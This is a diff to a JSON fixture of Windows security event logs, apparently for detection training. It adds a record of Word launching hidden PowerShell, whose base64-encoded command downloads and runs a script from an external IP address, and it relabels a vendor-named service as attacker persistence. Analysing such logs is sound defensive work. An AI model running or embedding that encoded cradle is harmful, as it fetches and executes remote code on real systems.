@@ -57,6 +57,18 @@
     "note": "Failed logon from external IP — brute force attempt"
   },
   {
+    "EventID": 4688,
+    "TimeCreated": "2024-11-15T07:45:30.000Z",
+    "Channel": "Security",
+    "Computer": "WS-JSMITH",
+    "SubjectUserName": "jsmith",
+    "TargetDomainName": "MERIDIAN",
+    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AdQAuAHAAcwAxACcAKQA=",
+    "note": "PowerShell spawned by WINWORD.EXE with -EncodedCommand — obfuscated execution (T1059.001)"
+  },
+  {
     "EventID": 4698,
     "TimeCreated": "2024-11-15T09:12:55.000Z",
     "Channel": "Security",
@@ -86,6 +98,6 @@
     "ImagePath": "C:\\Program Files (x86)\\Meridian Financial\\Update Service\\MeridianUpdater.exe",
     "ServiceType": "User Mode Win32 Service",
     "StartType": "Automatic",
-    "note": "Legitimate service — note the unquoted path (T1574.009)"
+    "note": "Attacker-installed service for persistence (T1543.003) masquerading as a vendor updater; also note the unquoted path (T1574.009)"
   }
 ]
